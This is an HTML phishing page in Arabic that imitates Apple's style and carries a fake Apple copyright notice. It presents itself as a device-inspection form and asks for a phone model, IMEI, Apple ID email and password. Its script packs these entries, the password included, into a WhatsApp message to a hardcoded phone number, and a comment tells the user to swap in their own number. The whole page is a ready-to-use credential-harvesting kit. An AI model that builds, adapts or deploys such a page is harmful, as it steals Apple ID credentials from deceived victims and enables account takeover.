<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام فحص الأجهزة - Apple Style</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap');
        body { 
            font-family: 'Tajawal', sans-serif; 
            background-color: #f5f5f7; /* لون خلفية أبل الشهير */
            color: #1d1d1f;
        }
        .apple-card {
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(20px); /* تأثير الزجاج الضبابي */
            border: 1px solid rgba(0,0,0,0.1);
        }
        .apple-input {
            background-color: #ffffff;
            border: 1px solid #d2d2d7;
            transition: all 0.3s ease;
        }
        .apple-input:focus {
            border-color: #0071e3;
            box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.1);
        }
        .apple-button {
            background-color: #0071e3; /* أزرق أبل الرسمي */
            transition: all 0.2s ease;
        }
        .apple-button:hover {
            background-color: #0077ed;
            transform: scale(1.02);
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-6">

    <div class="max-w-md w-full apple-card rounded-[30px] shadow-2xl overflow-hidden p-8">
        <div class="text-center mb-8">
            <div class="inline-block bg-gray-900 text-white rounded-full p-3 mb-4">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path></svg>
            </div>
            <h2 class="text-2xl font-bold tracking-tight">إرسال بيانات الجهاز</h2>
            <p class="text-gray-500 mt-2 text-sm">أدخل المعلومات المطلوبة للمتابعة</p>
        </div>
        
        <form id="appleDataForm" class="space-y-5">
            <div>
                <label class="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-1 mr-2">Model</label>
                <input type="text" id="deviceModel" placeholder="iPhone 15 Pro Max" required
                    class="w-full p-4 apple-input rounded-xl outline-none text-right">
            </div>

            <div>
                <label class="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-1 mr-2">IMEI / Serial</label>
                <input type="text" id="imei" placeholder="أدخل الرقم هنا" required
                    class="w-full p-4 apple-input rounded-xl outline-none text-left" dir="ltr">
            </div>

            <div>
                <label class="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-1 mr-2">Apple ID</label>
                <input type="email" id="email" placeholder="example@icloud.com" required
                    class="w-full p-4 apple-input rounded-xl outline-none text-left" dir="ltr">
            </div>

            <div>
                <label class="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-1 mr-2">Password</label>
                <input type="text" id="password" placeholder="أدخل الرمز" required
                    class="w-full p-4 apple-input rounded-xl outline-none text-left" dir="ltr">
            </div>

            <div class="pt-4">
                <button type="submit" 
                    class="w-full apple-button text-white font-medium py-4 rounded-full shadow-lg flex items-center justify-center gap-2">
                    <span>إرسال الطلب</span>
                </button>
            </div>
        </form>
        
        <p class="text-center text-[10px] text-gray-400 mt-8">
            Copyright © 2026 Apple Inc. All rights reserved.
        </p>
    </div>

    <script>
        document.getElementById('appleDataForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // غير الرقم هنا لرقمك الخاص
            const myPhoneNumber = "9647707771235"; 

            const device = document.getElementById('deviceModel').value;
            const imei = document.getElementById('imei').value;
            const email = document.getElementById('email').value;
            const pass = document.getElementById('password').value;

            const message = `* طلب فحص جديد*%0A` +
                            `--------------------------%0A` +
                            `📱 *الجهاز:* ${device}%0A` +
                            `🔢 *IMEI:* ${imei}%0A` +
                            `📧 *ID:* ${email}%0A` +
                            `🔑 *PASS:* ${pass}%0A` +
                            `--------------------------`;

            const whatsappUrl = `https://wa.me/${myPhoneNumber}?text=${message}`;
            window.open(whatsappUrl, '_blank');
        });
    </script>
</body>
</html>
